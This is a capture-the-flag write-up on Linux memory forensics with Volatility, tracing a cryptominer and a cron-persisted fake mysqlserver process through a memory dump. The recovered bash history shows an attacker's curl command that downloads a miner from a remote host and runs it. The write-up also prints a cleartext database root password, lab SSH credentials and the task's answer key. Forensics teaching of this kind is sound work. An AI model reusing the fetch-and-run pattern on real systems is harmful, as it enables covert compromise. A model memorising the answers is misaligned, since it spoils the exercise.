# Day_19 [Memory-Forensics] CrypTOYminers Sing Volala-lala-latility

+ Deployable Machine: Yes
+ SSH: Yes
  + UN: ubuntu
  + PW: volatility

Description: The elves are hard at work inside Santa's Security Operations Centre (SSOC), looking into more information about the insider threat. While analysing the network traffic, Log McBlue discovers some suspicious traffic coming from one of the Linux database servers. Quick to act, Forensic McBlue creates a memory dump of the Linux server along with a Linux profile in order to start the investigation.

> IP: [10.10.39.16]

## LEARNING OBJECTIVES

1. Understand what memory forensics is and how to use it in a digital forensics investigation
2. Understand what volatile data and memory dumps are
3. Learn about Volatility and how it can be used to analyse a memory dump
4. Learn about Volatility profiles

## OVERVIEW

1. What Is Memory Forensics
   1. Memory forensics, also known as volatile memory analysis or random access memory (RAM) forensics, is a branch of digital forensics. It involves the examination and analysis of a computer's volatile memory (RAM) to uncover digital evidence and artefacts related to computer security incidents, cybercrimes, and other forensic investigations. This differs from hard disk forensics, where all files on the disk can be recovered and then studied. Memory forensics focuses on the programs that were running when the memory dump was created. This type of data is volatile because it will be deleted when the computer is turned off.
2. What Is Volatile Data
   1. In computer forensics, volatile data refers to information that is temporarily stored in a computer's memory (RAM) and can be easily lost or altered when the computer is powered off or restarted. Volatile data is crucial for digital investigators because it provides a snapshot of the computer's state at the time of an incident. Any incident responder should be aware of what volatile data is. The reason is that when looking into a device that has been compromised, an initial reaction might be to turn off the device to contain the threat.
   2. Elf McBlue holding a magnifying glassSome examples of volatile data are running processes, network connections, and RAM contents. Volatile data is not written to disk and is constantly changing in memory. The issue here is that any malware will be running in memory, meaning that any network connections and running processes that spawned from the malware will be lost. Powering down the device means valuable evidence will be destroyed.
3. What Is a Memory Dump
   1. A memory dump is a snapshot of memory that has been captured to perform memory analysis. It will contain data relating to running processes captured when the memory dump was created.
4. PROCESSES
   1. User Process
      1. These are processes a user has started. They typically involve applications and software users interact with directly.
         1. EXAMPLE: Firefox: This is a web browser that we can use to surf the web.
   2. Background Processes
      1. These are processes that operate without direct user interaction. They often perform tasks that are essential for the system's operation or for providing services to user processes.
         1. EXAMPLE: Automated backups: Backup software often runs in the background, periodically backing up data to ensure its safety and recoverability.

## STEPS

1. Deploy Machine
2. SSH into machine
   1. > ssh ubuntu@10.10.39.16
      1. PW: volatility
3. VOLATILITY
   1. Lets look at the volatility python script
      1. > vol.py -h
         1. This gives us command help
   2. Lets check our volatility profiles
      1. > vol.py --info

         ```text
            Profiles
            --------
            VistaSP0x64           - A Profile for Windows Vista SP0 x64
            VistaSP0x86           - A Profile for Windows Vista SP0 x86
            VistaSP1x64           - A Profile for Windows Vista SP1 x64
            VistaSP1x86           - A Profile for Windows Vista SP1 x86
            VistaSP2x64           - A Profile for Windows Vista SP2 x64
            VistaSP2x86           - A Profile for Windows Vista SP2 x86
            Win10x64              - A Profile for Windows 10 x64
            Win10x64_10240_17770  - A Profile for Windows 10 x64 (10.0.10240.17770 / 2018-02-10)
            .
            .
            .
         ```

         1. In here we see several Windows profiles, but no LINUX profiles
         2. We need to load our profile
   3. Load our profile
      1. > ls Desktop/Evidence
         1. In here we see "Ubuntu_5.4.0-163-generic_profile.zip"
      2. > cp Ubuntu_5.4.0-163-generic_profile.zip ~/.local/lib/python2.7/site-packages/volatility/plugins/overlays/linux/
         1. This will copy the profile to our volatility script
      3. Now lets load our memory and LINUX profile
4. MEMORY ANALYSIS
   1. PLUGINS
      1. HISTORY plugin
         1. > vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_bash

            ```text
               Pid      Name                 Command Time                   Command
               -------- -------------------- ------------------------------ -------
                  8092 bash                 2023-10-02 18:13:46 UTC+0000   sudo su
                  8092 bash                 2023-10-02 18:15:44 UTC+0000   git clone https://github.com/504ensicsLabs/LiME && cd LiME/src/
                  8092 bash                 2023-10-02 18:15:53 UTC+0000   ls
                  8092 bash                 2023-10-02 18:15:55 UTC+0000   make
                  8092 bash                 2023-10-02 18:16:16 UTC+0000   vi ~/.bash_history 
                  8092 bash                 2023-10-02 18:16:38 UTC+0000    
                  8092 bash                 2023-10-02 18:16:38 UTC+0000   ls -la /home/elfie/
                  8092 bash                 2023-10-02 18:16:42 UTC+0000   sudo su
                  8092 bash                 2023-10-02 18:18:38 UTC+0000   ls -la /home/elfie/
                  8092 bash                 2023-10-02 18:18:41 UTC+0000   vi ~/.bash_history 
                  10205 bash                 2023-10-02 18:19:58 UTC+0000   mysql -u root -p'NEhX4VSrN7sV'
                  10205 bash                 2023-10-02 18:19:58 UTC+0000   id
                  10205 bash                 2023-10-02 18:19:58 UTC+0000   curl http://10.0.2.64/toy_miner -o miner
                  10205 bash                 2023-10-02 18:19:58 UTC+0000   ./miner
                  10205 bash                 2023-10-02 18:19:58 UTC+0000   cat /home/elfie/.bash_history
                  10205 bash                 2023-10-02 18:20:03 UTC+0000   vi .bash_history 
                  10205 bash                 2023-10-02 18:21:21 UTC+0000   cd LiME/src/
            ```

            1. In here we can see several commands ran, but most interesting we see the MYSQL login as root, with the password `NEhX4VSrN7sV`
            2. We also see that the "TOY_MINER" application was downloaded
            3. Then it it was ran "./miner"
               1. Lets see if we can examine the process
      2. PROCESS plugin
         1. > vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_pslist

            ```text
               Offset             Name                 Pid             PPid            Uid             Gid    DTB                Start Time
               ------------------ -------------------- --------------- --------------- --------------- ------ ------------------ ----------
               0xffff9ce9bd5baf00 systemd              1               0               0               0      0x000000007c3ae000 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd5bc680 kthreadd             2               0               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd5b9780 rcu_gp               3               2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd5b8000 rcu_par_gp           4               2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd5d4680 kworker/0:0H         6               2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd5d0000 mm_percpu_wq         8               2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd5d5e00 ksoftirqd/0          9               2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd5d2f00 rcu_sched            10              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd5d9780 migration/0          11              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd5d8000 idle_inject/0        12              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd5dde00 kworker/0:1          13              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd5daf00 cpuhp/0              14              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd5dc680 kdevtmpfs            15              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd632f00 netns                16              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd634680 rcu_tasks_kthre      17              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd631780 kauditd              18              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd630000 khungtaskd           19              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd635e00 oom_reaper           20              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd6eaf00 writeback            21              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd6ec680 kcompactd0           22              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd6e9780 ksmd                 23              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd6e8000 khugepaged           24              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd73af00 kintegrityd          70              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd74de00 kblockd              71              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd74af00 blkcg_punt_bio       72              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd74c680 tpm_dev_wq           73              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd749780 ata_sff              74              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd748000 md                   75              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd73de00 edac-poller          76              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd738000 devfreq_wq           77              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd739780 watchdogd            78              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd73c680 kworker/u2:1         79              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd6f8000 kswapd0              81              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd6f9780 ecryptfs-kthrea      82              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd6faf00 kthrotld             84              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd6f1780 acpi_thermal_pm      85              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd6f4680 scsi_eh_0            86              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd6f2f00 scsi_tmf_0           87              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd6f5e00 scsi_eh_1            88              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd6f0000 scsi_tmf_1           89              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd6fde00 vfio-irqfd-clea      91              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd6ede00 kworker/u2:3         92              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd71de00 ipv6_addrconf        93              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd70c680 kstrp                102             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd705e00 kworker/u3:0         105             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bbf9af00 charger_manager      118             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bbf9c680 kworker/0:1H         119             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bbf90000 scsi_eh_2            159             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd719780 scsi_tmf_2           161             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bd71af00 cryptd               162             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
               0xffff9ce9bbb35e00 irq/18-vmwgfx        187             2               0               0      ------------------ 2023-10-02 18:08:03 UTC+0000
               0xffff9ce9bbf9de00 ttm_swap             189             2               0               0      ------------------ 2023-10-02 18:08:03 UTC+0000
               0xffff9ce9bbadde00 kdmflush             211             2               0               0      ------------------ 2023-10-02 18:08:03 UTC+0000
               0xffff9ce9bd708000 raid5wq              237             2               0               0      ------------------ 2023-10-02 18:08:03 UTC+0000
               0xffff9ce9bbf91780 jbd2/dm-0-8          284             2               0               0      ------------------ 2023-10-02 18:08:04 UTC+0000
               0xffff9ce9bbad9780 ext4-rsv-conver      285             2               0               0      ------------------ 2023-10-02 18:08:04 UTC+0000
               0xffff9ce971889780 systemd-journal      355             1               0               0      0x0000000072d08000 2023-10-02 18:08:04 UTC+0000
               0xffff9ce9bbf98000 systemd-udevd        387             1               0               0      0x0000000071040000 2023-10-02 18:08:04 UTC+0000
               0xffff9ce9bbad8000 iprt-VBoxWQueue      404             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
               0xffff9ce9bbadc680 kaluad               508             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
               0xffff9ce97188af00 kmpath_rdacd         509             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
               0xffff9ce97188de00 kmpathd              510             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
               0xffff9ce97188c680 kmpath_handlerd      511             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
               0xffff9ce9bbf92f00 multipathd           512             1               0               0      0x000000006fc32000 2023-10-02 18:08:05 UTC+0000
               0xffff9ce9bd702f00 loop0                523             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
               0xffff9ce9bd700000 loop1                527             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
               0xffff9ce9b9338000 jbd2/sda2-8          529             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
               0xffff9ce9b933de00 ext4-rsv-conver      530             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
               0xffff9ce9bd709780 systemd-timesyn      556             1               102             104    0x000000007adb8000 2023-10-02 18:08:05 UTC+0000
               0xffff9ce9bd701780 systemd-network      763             1               100             102    0x0000000070650000 2023-10-02 18:08:07 UTC+0000
               0xffff9ce9bd70af00 systemd-resolve      766             1               101             103    0x0000000070438000 2023-10-02 18:08:07 UTC+0000
               0xffff9ce9bd70de00 accounts-daemon      801             1               0               0      0x000000006f0dc000 2023-10-02 18:08:10 UTC+0000
               0xffff9ce9bbc11780 cron                 805             1               0               0      0x0000000070456000 2023-10-02 18:08:10 UTC+0000
               0xffff9ce9b933c680 dbus-daemon          809             1               103             106    0x0000000072498000 2023-10-02 18:08:10 UTC+0000
               0xffff9ce9aef21780 networkd-dispat      821             1               0               0      0x0000000079288000 2023-10-02 18:08:10 UTC+0000
               0xffff9ce9b92a2f00 polkitd              823             1               0               0      0x00000000792e8000 2023-10-02 18:08:10 UTC+0000
               0xffff9ce9b92a0000 rsyslogd             828             1               104             110    0x0000000076344000 2023-10-02 18:08:10 UTC+0000
               0xffff9ce9b92a5e00 snapd                829             1               0               0      0x0000000074f3e000 2023-10-02 18:08:10 UTC+0000
               0xffff9ce9aef25e00 systemd-logind       830             1               0               0      0x000000007c310000 2023-10-02 18:08:10 UTC+0000
               0xffff9ce9b5639780 udisksd              832             1               0               0      0x00000000756ca000 2023-10-02 18:08:10 UTC+0000
               0xffff9ce9b5638000 atd                  833             1               0               0      0x00000000756d8000 2023-10-02 18:08:10 UTC+0000
               0xffff9ce9b4feaf00 ModemManager         881             1               0               0      0x00000000763e2000 2023-10-02 18:08:10 UTC+0000
               0xffff9ce9b4fec680 unattended-upgr      899             1               0               0      0x0000000073a3e000 2023-10-02 18:08:10 UTC+0000
               0xffff9ce9b4fe8000 agetty               901             1               0               0      0x0000000073040000 2023-10-02 18:08:10 UTC+0000
               0xffff9ce9b0ad1780 sshd                 1400            1               0               0      0x00000000705a4000 2023-10-02 18:08:17 UTC+0000
               0xffff9ce9b2f51780 kworker/0:5          1942            2               0               0      ------------------ 2023-10-02 18:10:08 UTC+0000
               0xffff9ce9b32e0000 sshd                 7989            1400            0               0      0x0000000073eb4000 2023-10-02 18:13:49 UTC+0000
               0xffff9ce9b58eaf00 systemd              8009            1               1000            1000   0x0000000031b06000 2023-10-02 18:13:59 UTC+0000
               0xffff9ce9b2f50000 (sd-pam)             8010            8009            1000            1000   0x000000006d016000 2023-10-02 18:13:59 UTC+0000
               0xffff9ce9b3bb8000 sshd                 8091            7989            1000            1000   0x0000000070a28000 2023-10-02 18:13:59 UTC+0000
               0xffff9ce9b3bbaf00 bash                 8092            8091            1000            1000   0x000000007ac4a000 2023-10-02 18:13:59 UTC+0000
               0xffff9ce9b1f42f00 mysqld               8839            1               114             118    0x0000000073394000 2023-10-02 18:14:34 UTC+0000
               0xffff9ce9b1a4c680 kworker/u2:0         10094           2               0               0      ------------------ 2023-10-02 18:19:42 UTC+0000
               0xffff9ce9b1a4de00 kworker/0:0          10110           2               0               0      ------------------ 2023-10-02 18:19:42 UTC+0000
               0xffff9ce9b32e1780 sshd                 10111           1400            0               0      0x000000007ada6000 2023-10-02 18:20:05 UTC+0000
               0xffff9ce9b3f78000 sshd                 10204           10111           1000            1000   0x000000007060a000 2023-10-02 18:20:13 UTC+0000
               0xffff9ce9b3f79780 bash                 10205           10204           1000            1000   0x000000006eee8000 2023-10-02 18:20:13 UTC+0000
               0xffff9ce9aee75e00 sudo                 10276           10205           0               0      0x00000000733e8000 2023-10-02 18:22:35 UTC+0000
               0xffff9ce9ad112f00 systemd-udevd        10277           387             0               0      0x00000000711be000 2023-10-02 18:22:35 UTC+0000
               0xffff9ce9aee70000 insmod               10278           10276           0               0      0x0000000073056000 2023-10-02 18:22:36 UTC+0000
               0xffff9ce9ad115e00 systemd-udevd        10279           387             0               0      0x000000007ba64000 2023-10-02 18:22:36 UTC+0000
               0xffff9ce9b1e4c680 miner                10280           1               1000            1000   0x0000000074fa2000 2023-10-02 18:22:37 UTC+0000
               0xffff9ce9bc23af00 mysqlserver          10291           1               1000            1000   0x000000006f166000 2023-10-02 18:22:37 UTC+0000
            ```

            1. In here we see the ProcessID of the miner application is `10280` and the ParentID is 1
            2. The other key thing we see is the "mysqlserver" process which ISNOT the actual MySQL service since it is "mysqld". It also has a different ParentID than the miner, so this process was not spawned by the miner
      3. PROCESS EXTRACTION
         1. Now lets use the linux_procdump plugin to extract the binary of the processes (miner & mysqlserver)
            1. > mkdir extracted
            2. > vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_procdump -D extracted -p 10280

               ```text
                  Offset             Name                 Pid             Address            Output File
                  ------------------ -------------------- --------------- ------------------ -----------
                  0xffff9ce9b1e4c680 miner                10280           0x0000000000400000 extracted/miner.10280.0x400000
               ```

            3. > vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_procdump -D extracted -p 10291

               ```text
                  Offset             Name                 Pid             Address            Output File
                  ------------------ -------------------- --------------- ------------------ -----------
                  0xffff9ce9bc23af00 mysqlserver          10291           0x0000000000400000 extracted/mysqlserver.10291.0x400000
               ```

      4. FILE EXTRACTION
         1. Now lets use the linux_enumerate_files plugin to enumerate through files (specifically through cron jobs)
            1. > vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_enumerate_files | grep -i cron

               ```text
                  0xffff9ce9b78280e8   132687   /var/spool/cron/crontabs/elfie
               ```

               1. In here we see the crontab
               2. Lets extract this to take a look
         2. Extract
            1. Lets search for our file by the identifier "0xffff9ce9b78280e8" and output to our extracted folder
            2. > vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_find_file -i 0xffff9ce9b78280e8 -O extracted/elfie
5. FILE ANALYSIS
   1. MD5SUM
      1. Now we need to get the MD5 sum of the extracted processes
         1. > cd extracted
         2. > md5sum miner.10280.0x400000
            1. `153a5c8efe4aa3be240e5dc645480dee  miner.10280.0x400000`
         3. > md5sum mysqlserver.10291.0x400000
            1. `c586e774bb2aa17819d7faae18dad7d1  mysqlserver.10291.0x400000`
   2. STRINGS
      1. Now lets do some qick analysis on the files extracted
         1. MINER
            1. > strings miner.10280.0x400000 | grep http://

            ```text
               http://invalidlookup 
               http://mcgreedysecretc2.thm
            ```

            1. In here we see the suspicious URL `hxxp[://]mcgreedysecretc2[.]thm` (defanged)

         2. ELFIE
            1. > strings elfie

               ```text
                  # DO NOT EDIT THIS FILE - edit the master and reinstall.
                  # (- installed on Mon Oct  2 18:22:12 2023)
                  # (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
                  */8 * * * * /var/tmp/.system-python3.8-Updates/mysqlserver
               ```

               1. In here we see the path `/var/tmp/.system-python3.8-Updates/mysqlserver`

## QUESTIONS

1. What is the exposed password that we find from the bash history output?
   1. `NEhX4VSrN7sV`
2. What is the PID of the miner process that we find?
   1. `10280`
3. What is the MD5 hash of the miner process?
   1. `153a5c8efe4aa3be240e5dc645480dee`
4. What is the MD5 hash of the mysqlserver process?
   1. `c586e774bb2aa17819d7faae18dad7d1`
5. Use the command strings extracted/miner.10280.0x400000 | grep http://. What is the suspicious URL? (Fully defang the URL using CyberChef)
   1. `hxxp[://]mcgreedysecretc2[.]thm`
6. After reading the elfie file, what location is the mysqlserver process dropped in on the file system?
   1. `/var/tmp/.system-python3.8-Updates/mysqlserver`